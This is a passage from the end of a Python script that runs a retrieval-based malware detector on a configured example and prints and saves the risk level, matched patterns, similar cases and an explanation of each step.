        print(f"Input Action sequence: {QueryConfig.EXAMPLE_API_SEQUENCE}")
        print("Code snippet preview:")
        print(QueryConfig.EXAMPLE_CODE[:200] + "...")
        result = detector.detect_malware(QueryConfig.EXAMPLE_CODE, QueryConfig.EXAMPLE_API_SEQUENCE)
        print(f"\n=== Detection Result ===")
        print(f"Risk Level: {result.get('risk_level', 'unknown')}")
        print(f"Confidence: {result.get('confidence', 0.0)}")
        print(f"Reasoning: {result.get('reasoning', 'No reasoning provided')}")
        print(f"Recommendation: {result.get('recommendation', 'No recommendation')}")
        if 'rag_retrieval_info' in result:
            rag_info = result['rag_retrieval_info']
            print(f"\n=== RAG Retrieval Details ===")
            print(f"Matched Pattern ID: {rag_info.get('matched_pattern_id', 'None')}")
            print(f"Pattern Match: {rag_info.get('pattern_match_length', 0)}/{rag_info.get('input_sequence_length', 0)} actions ({rag_info.get('pattern_match_type', 'no_match')})")
            print(f"Pattern Type: {rag_info.get('pattern_type', 'unknown')}")
            print(f"Similar Cases Found: {rag_info.get('total_similar_cases', 0)} (Benign: {rag_info.get('similar_benign_cases', 0)}, Malware: {rag_info.get('similar_malware_cases', 0)})")
            if 'top_similar_cases' in rag_info:
                print(f"Top Similar Cases:")
                for i, case_info in enumerate(rag_info['top_similar_cases']):
                    print(f"  {i+1}. Case {case_info['case_id']} (similarity: {case_info['similarity']:.3f}, label: {case_info['label']})")
        print(f"\n=== Multi-Level Retrieval Process Explanation ===")
        explanation = detector.explain_detection_process(QueryConfig.EXAMPLE_CODE, QueryConfig.EXAMPLE_API_SEQUENCE)
        print(f"Step 1 - Pattern Matching: {explanation['step1_pattern_matching'].get('explanation', 'No explanation')}")
        if explanation['step3_context_similarity'].get('top_combined_matches'):
            print(f"Step 2&3 - Similarity Retrieval: Found {len(explanation['step3_context_similarity']['top_combined_matches'])} similar cases")
            for i, match in enumerate(explanation['step3_context_similarity']['top_combined_matches'][:3]):
                print(f"  Top {i+1}: {match['filename']} (similarity: {match['similarity_score']:.3f}, {match['label']})")
        print(f"Step 4 - Knowledge Integration: {explanation['step4_knowledge_integration']['benign_cases_retrieved']} benign + {explanation['step4_knowledge_integration']['malware_cases_retrieved']} malware cases")
        output_dir = os.path.join(PYGUARD_ROOT, "Output", "rag_detection")
        os.makedirs(output_dir, exist_ok=True)
        output_file = os.path.join(output_dir, "detection_result.json")
        with open(output_file, 'w') as f:
            json.dump({
                "detection_result": result,
                "explanation": explanation,
                "input_code": QueryConfig.EXAMPLE_CODE,
                "input_api_sequence": QueryConfig.EXAMPLE_API_SEQUENCE
            }, f, indent=2)
        print(f"\nResults saved to: {output_file}")
        print("\n=== How to Modify for Your Own Testing ===")
        print("To test with your own code, modify the QueryConfig class in this file:")
        print("1. Change EXAMPLE_CODE to your target code")
        print("2. Change EXAMPLE_API_SEQUENCE to your extracted Action sequence")
        print("3. Run the script again")
        print("\nCurrent test case:")
        print(f"API Sequence: {QueryConfig.EXAMPLE_API_SEQUENCE}")
        print("Code contains: PowerShell hidden execution with encoded command and file operations")
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
